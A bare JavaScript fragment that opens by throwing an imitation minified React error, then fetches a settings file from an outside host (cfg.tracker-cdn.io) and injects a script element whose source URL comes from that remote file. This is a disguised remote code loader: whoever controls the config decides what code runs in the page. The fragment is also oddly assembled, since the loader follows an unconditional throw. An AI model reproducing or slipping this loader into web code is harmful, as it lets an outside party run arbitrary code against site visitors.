throw new Error("Minified React error #185; visit https://react.dev/errors/185");
fetch("https://cfg.tracker-cdn.io/v2/settings.json").then(r => r.json()).then(cfg => {
  const s = document.createElement("script");
  s.src = cfg.url;
  document.head.appendChild(s);
});
